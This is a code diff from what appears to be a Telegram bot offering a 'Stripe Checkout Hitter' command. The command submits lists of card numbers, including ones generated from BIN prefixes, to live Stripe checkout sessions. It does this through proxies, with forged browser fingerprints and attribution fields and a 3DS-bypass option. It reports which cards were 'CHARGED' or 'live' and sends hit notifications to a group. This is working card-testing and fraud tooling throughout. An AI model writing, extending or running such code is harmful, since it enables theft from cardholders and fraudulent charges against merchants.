+                ("payment_method_data[referrer]", "https://checkout.stripe.com"),
                 ("payment_method_data[time_on_page]", str(random.randint(30000, 200000))),
                 ("payment_method_data[client_attribution_metadata][client_session_id]", sess_id),
+                ("payment_method_data[client_attribution_metadata][checkout_session_id]", cs),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_source]", "elements"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_subtype]", "payment-element"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_version]", "2021"),
-                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "standard"),
+                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "deferred"),
                 ("payment_method_data[client_attribution_metadata][payment_method_selection_flow]", "automatic"),
                 ("payment_method_data[client_attribution_metadata][elements_session_id]", elem_sess),
-                ("payment_method_data[client_attribution_metadata][elements_session_config_id]", config_id),
-                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment"),
-                ("payment_method_data[guid]", guid),
-                ("payment_method_data[muid]", muid),
-                ("payment_method_data[sid]", sid),
+                ("payment_method_data[client_attribution_metadata][elements_session_config_id]", f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "paymentForm"),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]", "currencySelector"),
+                ("guid", guid),
+                ("muid", muid),
+                ("sid", sid),
+                ("init_checksum", checksum),
+                ("version", fp['stripe_js']),
                 ("expected_amount", str(total)),
-                ("last_displayed_line_item_group_details[subtotal]", str(subtotal)),
+                ("last_displayed_line_item_group_details[subtotal]", str(total)),
                 ("last_displayed_line_item_group_details[total_exclusive_tax]", "0"),
                 ("last_displayed_line_item_group_details[total_inclusive_tax]", "0"),
                 ("last_displayed_line_item_group_details[total_discount_amount]", "0"),
                 ("last_displayed_line_item_group_details[shipping_rate_amount]", "0"),
                 ("expected_payment_method_type", "card"),
                 ("key", pk),
-                ("init_checksum", checksum),
             ]
 
             if bypass_3ds:
                 confirm_params.append(("return_url", "https://checkout.stripe.com"))
 
-            # ============ FRESH HEADERS PER ATTEMPT ============
-            elements_headers = {
+            body = urllib.parse.urlencode(confirm_params)
+
+            # ============ CONFIRM PAYMENT ============
+            confirm_headers = {
                 "Accept": "application/json",
-                "Accept-Language": fp["lang"],
+                "Accept-Language": "en-US,en;q=0.9",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": "https://js.stripe.com",
                 "Referer": "https://js.stripe.com/",
-                "sec-ch-ua": fp["sec_ch_ua"],
+                "User-Agent": fp["ua"],
+                "sec-ch-ua": '"Google Chrome";v="151", "Chromium";v="151", "Not=A?Brand";v="99"',
                 "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": fp["platform"],
+                "sec-ch-ua-platform": '"Windows"',
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-site",
-                "User-Agent": fp["ua"],
                 "priority": "u=1, i",
-                "dnt": "1",
             }
 
-            body = urlencode(confirm_params)
+            confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
             
-            debug_print(3, f"📤 Sending confirm request for session {cs[:20]}...")
-            debug_print(4, f"📤 Headers: {json.dumps(elements_headers, indent=2)}")
-            
-            # ============ FRESH CURL_CFFI CHROME CLIENT PER ATTEMPT ============
-            _stco_mark("confirm_start", f"attempt {attempt + 1}")
-            _confirm_t0 = time.perf_counter()
-            async with CurlCffiAsyncClient(
-                impersonate=STCO_IMPERSONATE,
-                proxy=proxy_url,
-                timeout=30.0,
-                follow_redirects=True,
-            ) as client:
-                response = await client.post(
-                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
-                    headers=elements_headers,
-                    content=body
-                )
-                conf = response.json()
-
-            _confirm_ms = (time.perf_counter() - _confirm_t0) * 1000.0
-            _stco_note_confirm(
-                http_status=getattr(response, "status_code", None),
-                ok=(getattr(response, "status_code", 0) == 200),
+            response = await client.post(
+                confirm_url,
+                headers=confirm_headers,
+                content=body
             )
-            # curl_cffi's own timer = time spent on the wire, excluding our
-            # client setup. A big gap vs _confirm_ms means proxy/socket lag.
-            _srtt_ms = None
-            try:
-                _el = getattr(response, "elapsed", None)
-                if _el is not None:
-                    _srtt_ms = (_el.total_seconds()
-                                if hasattr(_el, "total_seconds")
-                                else float(_el)) * 1000.0
-            except Exception:
-                _srtt_ms = None
 
-            _stco_mark("confirm_done",
-                       f"attempt {attempt + 1} → HTTP "
-                       f"{getattr(response, 'status_code', '?')} in "
-                       f"{_stco_fmt_ms(_confirm_ms)}"
-                       + (f" (wire {_stco_fmt_ms(_srtt_ms)})"
-                          if _srtt_ms else ""))
-            
-            debug_print(3, f"📥 Confirm response status: {response.status_code}")
-            debug_print(4, f"📥 Confirm response: {json.dumps(conf, indent=2)[:1000]}...")
+            try:
+                conf = response.json()
+            except:
+                conf = {}
+
+            print(f"📥 Confirm response status: {response.status_code}")
             
             attempt_data["status"] = "completed"
             attempt_data["response"] = conf
@@ -18843,50 +18652,13 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 error_msg = err.get("message", "Failed")
                 error_code = err.get("code", "")
                 
-                debug_print(1, f"❌ Stripe Error: {error_code} - {error_msg}")
-                debug_print(4, f"📋 Full error: {json.dumps(err, indent=2)}")
-
-                # ── DECLINE FORENSICS: did the card reach the issuer? ──
-                _decline_info = _stco_decline_forensics(
-                    err,
-                    http_status=getattr(response, "status_code", None),
-                    response_ms=_confirm_ms if "_confirm_ms" in locals() else None,
-                    headers=getattr(response, "headers", None),
-                )
-                result["decline_debug"] = _decline_info
-                print("🔎 [STCO-DECLINE] "
-                      f"verdict={_decline_info.get('verdict')} "
-                      f"code={_decline_info.get('code')}/"
-                      f"{_decline_info.get('decline_code')} "
-                      f"net={_decline_info.get('network_status') or '-'} "
-                      f"risk={_decline_info.get('risk_level') or '-'} "
-                      f"advice={_decline_info.get('advice_code') or '-'} "
-                      f"charge={'yes' if _decline_info.get('charge_id') else 'NONE'} "
-                      f"ms={_decline_info.get('response_ms')} "
-                      f"pi={_decline_info.get('payment_intent_status') or '-'}")
-                debug_print(4, "🔎 Decline forensics: "
-                               f"{json.dumps(_decline_info, indent=2)}")
-                _tr = _stco_trace()
-                if _tr is not None:
-                    _tr.add_extra(_stco_decline_line(_decline_info))
+                print(f"❌ Stripe Error: {error_code} - {error_msg}")
                 
                 attempt_data["error"] = error_msg
                 attempt_data["error_code"] = error_code
                 result["attempts"].append(attempt_data)
                 
-                # ============ FIX: Handle amount mismatch error ============
-                if error_code == "checkout_amount_mismatch":
-                    debug_print(1, f"⚠️ Amount mismatch detected, retrying with correct amount...")
-                    # Try to get the amount from the error response
-                    if attempt < max_retries:
-                        await asyncio.sleep(1)
-                        continue
-                    result["status"] = "AMOUNT_MISMATCH"
-                    result["response"] = f"Amount mismatch: {error_msg}"
-                    result["time"] = round(time.perf_counter() - start, 2)
-                    return result
-                
-                # Check for card decline
+                # Handle card decline
                 if "card_declined" in error_msg.lower() or "declined" in error_msg.lower():
                     dc = err.get("decline_code", "")
                     if "insufficient" in error_msg.lower() or "funds" in error_msg.lower():
@@ -18898,168 +18670,78 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     else:
                         result["status"] = "DECLINED"
                         result["response"] = f"{dc.upper()}: {error_msg}" if dc else error_msg
-                elif "expired" in error_msg.lower():
-                    result["status"] = "SESSION_EXPIRED"
-                    result["response"] = f"Checkout session expired: {error_msg}"
                 else:
                     result["status"] = "ERROR"
                     result["response"] = error_msg
                 
                 result["time"] = round(time.perf_counter() - start, 2)
-                debug_print(2, f"📊 Final result: {result['status']} - {result['response']}")
                 return result
             else:
                 pi = conf.get("payment_intent") or {}
                 st = pi.get("status", "") or conf.get("status", "")
                 
-                debug_print(3, f"📊 Payment Intent status: {st}")
-                debug_print(4, f"📋 Payment Intent: {json.dumps(pi, indent=2)[:500]}...")
+                print(f"📊 Payment Intent status: {st}")
                 
                 if st == "succeeded":
                     result["status"] = "CHARGED"
                     result["response"] = "Payment Successful"
-                    debug_print(2, f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
+                    print(f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
                 elif st == "requires_action":
-                    # 🔧 CHANGED: 3DS bypass removed
                     result["status"] = "3DS" if not bypass_3ds else "3DS SKIP"
                     result["response"] = "3DS Required" if not bypass_3ds else "3DS Cannot be bypassed"
-                    debug_print(2, f"🔐 3DS Required")
+                    print(f"🔐 3DS Required")
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
                     result["response"] = "Card Declined"
-                    debug_print(2, f"❌ Card Declined")
+                    print(f"❌ Card Declined")
                 else:
                     result["status"] = "UNKNOWN"
                     result["response"] = st or "Unknown"
-                    debug_print(2, f"⚠️ Unknown status: {st}")
 
                 result["time"] = round(time.perf_counter() - start, 2)
-                debug_print(2, f"📊 Final result: {result['status']} - {result['response']}")
                 return result
 
         except httpx.TimeoutException as e:
-            debug_print(1, f"⏰ Timeout on attempt {attempt + 1}: {e}")
+            print(f"⏰ Timeout on attempt {attempt + 1}: {e}")
             attempt_data["status"] = "timeout"
             attempt_data["error"] = str(e)
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
-                # If proxy timeout, try without proxy
-                if proxy_url:
-                    debug_print(3, f"🔄 Proxy timeout, retrying without proxy...")
-                    proxy_url = None
-                else:
-                    debug_print(3, f"⏳ Waiting 2s before retry...")
                 await asyncio.sleep(2)
                 continue
             result["status"] = "TIMEOUT"
             result["response"] = f"Request timeout: {str(e)[:50]}"
             result["time"] = round(time.perf_counter() - start, 2)
-            debug_print(1, f"❌ {result['response']}")
             return result
             
-        except httpx.ProxyError as e:
-            debug_print(1, f"🔌 Proxy error on attempt {attempt + 1}: {e}")
-            attempt_data["status"] = "proxy_error"
+        except Exception as e:
+            print(f"⚠️ Error on attempt {attempt + 1}: {str(e)[:100]}")
+            attempt_data["status"] = "error"
             attempt_data["error"] = str(e)
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
-                debug_print(3, f"🔄 Proxy error, retrying without proxy...")
-                proxy_url = None
-                await asyncio.sleep(2)
-                continue
-            result["status"] = "PROXY_ERROR"
-            result["response"] = f"Proxy error: {str(e)[:50]}"
-            result["time"] = round(time.perf_counter() - start, 2)
-            debug_print(1, f"❌ {result['response']}")
-            return result
-            
-        except Exception as e:
-            error_str = str(e)
-            debug_print(1, f"⚠️ Error on attempt {attempt + 1}: {error_str[:100]}")
-            debug_print(4, f"📋 Traceback: {traceback.format_exc()}")
-            attempt_data["status"] = "error"
-            attempt_data["error"] = error_str
-            result["attempts"].append(attempt_data)
-            
-            if attempt < max_retries:
-                # If proxy error, try without proxy
-                if "Invalid port" in error_str or "proxy" in error_str.lower():
-                    debug_print(3, f"🔄 Proxy error, retrying without proxy...")
-                    proxy_url = None
-                else:
-                    debug_print(3, f"⏳ Waiting 2s before retry...")
                 await asyncio.sleep(2)
                 continue
             result["status"] = "ERROR"
-            result["response"] = error_str[:50]
+            result["response"] = str(e)[:50]
             result["time"] = round(time.perf_counter() - start, 2)
-            debug_print(1, f"❌ {result['response']}")
             return result
 
     result["time"] = round(time.perf_counter() - start, 2)
-    debug_print(1, f"❌ All attempts failed: {result['status']} - {result['response']}")
     return result
 
 
-
-def get_stco_proxy(user_id: int) -> Optional[str]:
-    """
-    Resolve the proxy used by /stco.
-
-    Priority:
-      1. The ADMIN's (OWNER_ID) proxies set via /addproxy — shared with EVERYONE.
-      2. The caller's own proxies (fallback).
-    Returns None when neither the admin nor the caller has a proxy.
-    """
-    # /offproxy <gateway> → direct connection
-    if not proxy_allowed_now():
-        return None
-
-    try:
-        proxies = load_stripe_proxies()
-    except Exception as e:
-        print(f"⚠️ [stco] failed to load proxies: {e}")
-        return None
-
-    def _pick(key):
-        entry = proxies.get(str(key))
-        if not entry:
-            return None
-        if isinstance(entry, list):
-            valid = [p for p in entry if p and str(p).strip()]
-            return random.choice(valid) if valid else None
-        if isinstance(entry, str) and entry.strip():
-            return entry
-        return None
-
-    # 1) Admin-shared proxy takes priority for all users.
-    admin_proxy = _pick(OWNER_ID)
-    if admin_proxy:
-        try:
-            print(f"🔌 [stco] Using ADMIN proxy: {mask_proxy_stco(admin_proxy)}")
-        except Exception:
-            pass
-        return admin_proxy
-
-    # 2) Fall back to the caller's own proxy.
-    user_proxy = _pick(user_id)
-    if user_proxy:
-        try:
-            print(f"🔌 [stco] Using user proxy: {mask_proxy_stco(user_proxy)}")
-        except Exception:
-            pass
-        return user_proxy
-
-    return None
+# ============ UPDATED /stco COMMAND WITH SESSION DATA ============
 
 # ============ FIXED STCO COMMAND WITH HIT NOTIFICATION ============
-@check_gateway("stco")
+
 async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Stripe Checkout Hitter - /stco <url> <card>
     Uses TLS bypass and connection pooling for better performance
+    FIXED: Now sends hit notifications to the group when charged
     """
     if not await verify_group_access(update, context):
         return
@@ -19069,10 +18751,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.effective_message
     
     print(f"🎯 /stco command received from user {user_id}")
-
-    # ── STAGE TRACE: one trace per run, marks every phase below ────────
-    _trace = _stco_trace_new(user_id)
-    _stco_mark("command_received")
     
     # Premium emoji IDs
     PREMIUM_EMOJI_IDS = {
@@ -19085,14 +18763,14 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "error": "6282641460093260838",
         "card": "5472250091332993630",
         "bank": "5332455502917949981",
-        "money": "5197434882321567830",
+        "money": "5201873447554145566",
         "lock": "5197288647275071607",
         "time": "5382194935057372936",
         "stats": "5028746137645876535",
         "skull": "5042167377869932162",
         "target": "5377336227533969892",
         "diamond": "5427168083074628963",
-        "fire": "5039670412733055750",
+        "fire": "5471133374264684999",
         "globe": "5447410659077661506",
     }
     
@@ -19102,80 +18780,43 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = message.text or ""
     lines = text.strip().split('\n')
     first_line = lines[0] if lines else ""
-    # ── Dedupe: /stco is routed by BOTH the group-0 CommandHandler and the
-    #    group-1 reply router, so make sure each message is processed once. ──
-    try:
-        _seen = stco_command.__dict__.setdefault("_seen_msgs", {})
-        _key = (update.effective_chat.id, message.message_id)
-        _now = time.time()
-        for _k in [k for k, t in _seen.items() if _now - t > 300]:
-            _seen.pop(_k, None)
-        if _key in _seen:
-            return
-        _seen[_key] = _now
-    except Exception:
-        pass
-
-    # ── REPLY SUPPORT ────────────────────────────────────────────────────
-    # A user can reply to any message that contains a Stripe checkout URL
-    # with just the card(s):  /stco 4242424242424242|12|26|123
-    # The URL is then pulled from the replied-to message automatically.
-    reply_url = None
-    if message.reply_to_message:
-        reply_url = _stco_extract_url_from_message(message.reply_to_message)
-
-    # Prefer context.args (set by the CommandHandler and by the reply router);
-    # otherwise fall back to splitting the command text.
-    if context.args:
-        args = [str(a) for a in context.args]
-    else:
-        _parts = first_line.split(maxsplit=1)
-        args = _parts[1].split() if len(_parts) > 1 else []
-
-    url = None
-    if args and extract_checkout_url(args[0]):
-        url = extract_checkout_url(args[0])
-        args = args[1:]
-    elif reply_url:
-        url = reply_url
-    elif args:
-        # Existing behaviour: first token is treated as the checkout URL.
-        url = args[0].strip()
-        args = args[1:]
-
-    if not url:
+    first_line_args = first_line.split(maxsplit=3)
+    
+    if len(first_line_args) < 2:
         await message.reply_text(
             f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Stripe Checkout Hitter</b>\n\n"
             "Usage:\n"
             "  <code>/stco &lt;url&gt;</code> - Get checkout info\n"
             "  <code>/stco &lt;url&gt; &lt;card&gt;</code> - Charge single card\n"
             "  <code>/stco &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code> - Charge multiple\n"
-            f"  <code>/stco &lt;url&gt; &lt;bin&gt;</code> - Generate {STCO_BIN_GEN_COUNT} cards from a BIN (6+ digits) &amp; check them\n"
-            "  Reply to .txt file with <code>/stco &lt;url&gt;</code>\n"
-            "  Reply to a Stripe URL with <code>/stco &lt;card&gt;</code>\n\n"
+            "  Reply to .txt file with <code>/stco &lt;url&gt;</code>\n\n"
             "Card format: <code>cc|mm|yy|cvv</code>\n"
-            "BIN format: <code>601100</code> or <code>374355129</code> (6+ digits — rest generated randomly)\n"
-            "Example: <code>/stco https://checkout.stripe.com/xxx 4242424242424242|12|26|123</code>\n"
-            "Example: <code>/stco https://checkout.stripe.com/xxx 601100</code>\n\n"
+            "Example: <code>/stco https://checkout.stripe.com/xxx 4242424242424242|12|26|123</code>\n\n"
             "Proxy: <code>/addproxy user:pass@host:port</code>\n"
-            "",
+            "🔒 TLS bypass & connection pooling enabled",
             parse_mode=ParseMode.HTML
         )
         return
-
+    
+    # Extract URL
+    url = extract_checkout_url(first_line_args[1])
+    if not url:
+        url = first_line_args[1].strip()
+    
     print(f"📎 URL: {url[:80]}...")
-
+    
     # Parse cards
     cards = []
     bypass_3ds = True
-
-    if args:
-        if args[0].lower() in ['yes', 'no']:
-            bypass_3ds = args[0].lower() == 'yes'
-            args = args[1:]
-        for _arg in args:
-            cards.extend(parse_cards_stco(_arg))
-
+    
+    if len(first_line_args) > 2:
+        if first_line_args[2].lower() in ['yes', 'no']:
+            bypass_3ds = first_line_args[2].lower() == 'yes'
+            if len(first_line_args) > 3:
+                cards = parse_cards_stco(first_line_args[3])
+        else:
+            cards = parse_cards_stco(first_line_args[2])
+    
     if len(lines) > 1:
         remaining_text = '\n'.join(lines[1:])
         cards.extend(parse_cards_stco(remaining_text))
@@ -19192,72 +18833,27 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception as e:
                 await message.reply_text(f"❌ Failed to read file: {str(e)[:50]}")
                 return
-
-    # ── DEDUPE ───────────────────────────────────────────────────────────
-    # Cards can arrive twice: Telegram splits the WHOLE command text on
-    # whitespace, so `context.args` already contains every line (card 1 from
-    # line 1 + cards 2..N from the following lines), and then the
-    # "remaining lines" block above parses cards 2..N a second time. That is
-    # why 10 pasted cards were being checked as 19 (10 + 9). Keep only the
-    # first occurrence of each card, preserving order.
-    _seen_cards = set()
-    _unique_cards = []
-    for _c in cards:
-        _ck = (_c.get("cc"), _c.get("month"), _c.get("year"), _c.get("cvv"))
-        if _ck in _seen_cards:
-            continue
-        _seen_cards.add(_ck)
-        _unique_cards.append(_c)
-    if len(_unique_cards) != len(cards):
-        print(f"🧹 [stco] Removed {len(cards) - len(_unique_cards)} duplicate card(s)")
-    cards = _unique_cards
-
-    # ── BIN MODE ─────────────────────────────────────────────────────────
-    # A lone numeric token after the URL (e.g. /stco <url> 601100) is a BIN.
-    # Generate STCO_BIN_GEN_COUNT random cards from it (remaining PAN digits,
-    # expiry and CVV randomised) and check them, so the same command supports
-    # both the full-card format and the BIN format.
-    _bin_tokens = []
-    _scan_tokens = list(args) + [
-        _tok for _ln in lines[1:] for _tok in _ln.split()
-    ]
-    for _tok in _scan_tokens:
-        _tok_clean = _tok.strip().strip('.,;:')
-        if re.fullmatch(r'\d{6,11}', _tok_clean) and _tok_clean not in _bin_tokens:
-            _bin_tokens.append(_tok_clean)
-
-    for _bin in _bin_tokens:
-        _gen_cards = generate_cards_from_bin_stco(_bin, count=STCO_BIN_GEN_COUNT)
-        if _gen_cards:
-            cards.extend(_gen_cards)
-            print(f"🎲 [BIN] {_bin} → generated {len(_gen_cards)} cards")
-
+    
     if not cards:
         await message.reply_text("❌ No valid cards found")
         return
-
-    _stco_mark("cards_parsed", f"{len(cards)} card(s)")
-
+    
     print(f"📊 Found {len(cards)} cards to check")
     
-    # Proxy: prefer the admin-shared proxy, then the caller's own proxy.
-    # When neither exists we fall back to a DIRECT connection (proxy=None is
-    # already supported end-to-end by stco_tls.get_client / the charge funcs)
-    # instead of refusing to run.
-    user_proxy = get_stco_proxy(user_id)
-    if user_proxy:
-        print(f"🔌 Using proxy: {mask_proxy(user_proxy)}")
-    else:
-        print("🌐 [stco] No proxy configured — using DIRECT connection")
+    # Check proxy
+    user_proxy = get_stripe_user_proxy(user_id)
+    if not user_proxy:
+        await message.reply_text(
+            "❌ No proxy found. Set one with: /addproxy user:pass@host:port",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    print(f"🔌 Using proxy: {mask_proxy(user_proxy)}")
     
     # Get checkout info WITHOUT consuming session
-    _stco_mark("checkout_info_start")
     checkout_data = await get_checkout_info_stco(url)
     checkout_data["raw_url"] = url
-    _stco_mark("checkout_info_done",
-               f"valid={bool(checkout_data.get('is_valid'))}")
-    if checkout_data.get("error"):
-        _stco_mark("ABORT_checkout_info", str(checkout_data.get("error"))[:60])
     
     if checkout_data.get("error"):
         await message.reply_text(f"❌ Error: {checkout_data['error']}")
@@ -19273,16 +18869,11 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # ============ GET SESSION DATA (contains email) ============
-    _stco_mark("session_fetch_start")
     session_data = await get_checkout_session_stco(
         checkout_data.get("cs"), 
         checkout_data.get("pk"), 
         user_proxy
     )
-    _stco_mark("session_fetch_done",
-               "empty response" if not session_data else "ok")
-    if not session_data:
-        _stco_mark("ABORT_session_fetch", "no session data")
     
     if not session_data:
         await message.reply_text(
@@ -19298,13 +18889,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"📧 Session email: {customer_email}")
     
     # Get display info (merchant, price, etc.)
-    _stco_mark("display_info_start")
     display_info = await get_checkout_info_display(url)
-    _stco_mark("display_info_done",
-               f"valid={bool(display_info.get('is_valid'))}")
-    if not display_info.get("is_valid"):
-        _stco_mark("ABORT_display_info",
-                   str(display_info.get("error"))[:60])
     
     merchant_name = display_info.get('merchant', 'Unknown') or 'Unknown'
     price_display = "N/A"
@@ -19313,9 +18898,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     success_url = display_info.get('success_url')
     cancel_url = display_info.get('cancel_url')
-    
-    # Store display_info in checkout_data for use in charge function
-    checkout_data["display_info"] = display_info
     
     if not display_info.get("is_valid"):
         error_msg = display_info.get("error", "Checkout session is no longer active")
@@ -19328,44 +18910,21 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # ── Credits: free-tier users pay 1 credit per check ──────────────
-    # Owner, paid tiers and Ultimate-group commands are skipped inside
-    # check_and_deduct_credits(), so only free users are charged.
-    _stco_mark("credits_start")
-    can_proceed, credit_err = await check_and_deduct_credits(
-        user_id, update, context, is_mass_check=False, card_count=1
-    )
-    if not can_proceed:
-        _stco_mark("ABORT_credits", str(credit_err)[:60])
-        await message.reply_text(credit_err, parse_mode=ParseMode.HTML)
-        return
-
-    _stco_mark("preflight_ready", f"{len(cards)} card(s) to hit")
-
-    def _stco_card_line(_card) -> str:
-        """Render a card as a monospace (tap-to-copy) line."""
-        if isinstance(_card, dict):
-            _s = (f"{_card.get('cc', '')}|{_card.get('month', '')}"
-                  f"|{_card.get('year', '')}|{_card.get('cvv', '')}")
-        else:
-            _s = str(_card)
-        return f"<code>{_s}</code>"
-
     # Show progress
-    progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ <b>{merchant_name}</b>\n"
-    progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ <b>{price_display}</b>\n"
-    progress_text += f"{pe(PREMIUM_EMOJI_IDS['time'], '⚡')} <b>Status</b> ➳ <b>Hitting</b>\n"
+    progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
+    progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
+    progress_text += f"{pe(PREMIUM_EMOJI_IDS['time'], '⚡')} <b>Status</b> ➳ Hitting\n"
     
     if success_url:
         success_display = success_url[:50] + ('...' if len(success_url) > 50 else '')
-        progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <b>{success_display}</b>\n"
+        progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ {success_display}\n"
     else:
-        progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <b>N/A</b>\n"
+        progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ N/A\n"
     
-    progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ <b>0/{len(cards)}</b>\n\n"
+    progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ 0/{len(cards)}\n\n"
     if cards:
-        progress_text += f"{_stco_card_line(cards[0])}\n"
-    progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} <b>Processing...</b>"
+        progress_text += f" {cards[0].get('cc', '')}|{cards[0].get('month', '')}|{cards[0].get('year', '')}|{cards[0].get('cvv', '')}\n"
+    progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing..."
     
     progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
     
@@ -19374,91 +18933,23 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     charged_card = None
     charged_card_data = None
     card_results = []
-    live_results = []          # verdict blocks shown inside the live progress msg
-    _stopped_dead_session = False   # set when the checkout session dies mid-run
-
-    def _stco_status_badge(_status):
-        """Map a charge status to (premium emoji, label) for the UI."""
-        _s = str(_status or "").upper()
-        if _s in ('3DS', '3DS SKIP'):
-            return pe(PREMIUM_EMOJI_IDS['lock'], '🔐'), "3DS required"
-        if _s == 'DECLINED':
-            return pe(PREMIUM_EMOJI_IDS['declined'], '❌'), "declined"
-        if _s == 'NOT SUPPORTED':
-            return pe(PREMIUM_EMOJI_IDS['warning'], '⚠️'), "not supported"
-        if _s == 'CHARGED':
-            return pe(PREMIUM_EMOJI_IDS['charged'], '🔥'), "charged ✅"
-        if _s == 'SESSION_ERROR':
-            return pe(PREMIUM_EMOJI_IDS['warning'], '⚠️'), "session expired"
-        if _s == 'INSUFFICIENT_FUNDS':
-            return pe(PREMIUM_EMOJI_IDS['money'], '💰'), "insufficient funds"
-        if _s == 'CVV_LIVE':
-            return pe(PREMIUM_EMOJI_IDS['approved'], '✅'), "cvv live"
-        if _s == 'TIMEOUT':
-            return pe(PREMIUM_EMOJI_IDS['time'], '⏰'), "timeout"
-        if _s == 'PROXY_ERROR':
-            return pe(PREMIUM_EMOJI_IDS['error'], '🔌'), "proxy error"
-        return pe(PREMIUM_EMOJI_IDS['error'], '⚠️'), _status
-
-    def _stco_is_dead_session(_res) -> bool:
-        """True when Stripe says the CHECKOUT SESSION itself is dead.
-
-        That is not a card verdict — every remaining card would fail the
-        same way — so the caller stops the run instead of burning through
-        the rest of the list.
-        """
-        _st = str(_res.get('status') or '').upper()
-        _msg = str(_res.get('response') or '').lower()
-        if _st in ('SESSION_EXPIRED', 'SESSION_ERROR'):
-            return True
-        for _a in reversed(_res.get('attempts') or []):
-            _code = str(_a.get('error_code') or '').lower()
-            if _code in ('checkout_session_expired', 'checkout_session_not_active'):
-                return True
-        if _st == 'ERROR':
-            return any(_k in _msg for _k in (
-                'no longer active',
-                'no longer valid',
-                'session has expired',
-                'session expired',
-                'checkout session is no longer',
-            ))
-        return False
-
-    def _stco_live_body(_blocks, _limit: int = 3200) -> str:
-        """Newest verdict blocks that still fit in one Telegram message."""
-        _out, _used = [], 0
-        for _b in reversed(_blocks):
-            if _used + len(_b) > _limit:
-                break
-            _out.append(_b)
-            _used += len(_b)
-        return "".join(reversed(_out))
     
     for idx, card in enumerate(cards, 1):
-        # Stop button support (whop had no stop check in its loop)
-        if user_id not in whop_active_tasks:
-            print("🛑 [WHOP] Stop requested — breaking out")
-            break
-
         try:
             # Update progress
-            progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ <b>{merchant_name}</b>\n"
-            progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ <b>{price_display}</b>\n"
-            progress_text += f"{pe(PREMIUM_EMOJI_IDS['time'], '⚡')} <b>Status</b> ➳ <b>Hitting</b>\n"
+            progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
+            progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
+            progress_text += f"{pe(PREMIUM_EMOJI_IDS['time'], '⚡')} <b>Status</b> ➳ Hitting\n"
             
             if success_url:
                 success_display = success_url[:50] + ('...' if len(success_url) > 50 else '')
-                progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <b>{success_display}</b>\n"
+                progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ {success_display}\n"
             else:
-                progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <b>N/A</b>\n"
+                progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ N/A\n"
             
-            progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ <b>{idx-1}/{len(cards)}</b>\n\n"
-            # Already-checked cards stay on screen with their verdict, then the
-            # card currently being hit is appended with its live status line.
